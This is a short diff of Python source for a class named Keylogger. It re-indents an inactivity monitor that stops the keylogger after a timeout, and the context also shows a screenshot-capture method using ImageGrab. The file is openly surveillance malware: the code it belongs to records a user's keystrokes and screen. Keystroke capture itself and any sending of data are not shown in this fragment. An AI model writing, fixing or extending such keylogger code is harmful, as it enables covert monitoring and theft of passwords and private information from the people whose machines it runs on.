@@ -39,12 +39,12 @@ class Keylogger:
             time.sleep(5)
 
     # Monitor inactivity
-        def monitor_inactivity(self):
-            while self.keylogger_running:
-                if time.time() - self.last_activity > self.timeout:
-                    print("Inactivity detected. Stopping keylogger.")
-                    self.stop_key_logger()
-                time.sleep(5)
+    def monitor_inactivity(self):
+        while self.keylogger_running:
+            if time.time() - self.last_activity > self.timeout:
+                print("Inactivity detected. Stopping keylogger.")
+                self.stop_key_logger()
+            time.sleep(5)
 
     def capture_screenshot(self):
         screenshot = ImageGrab.grab()
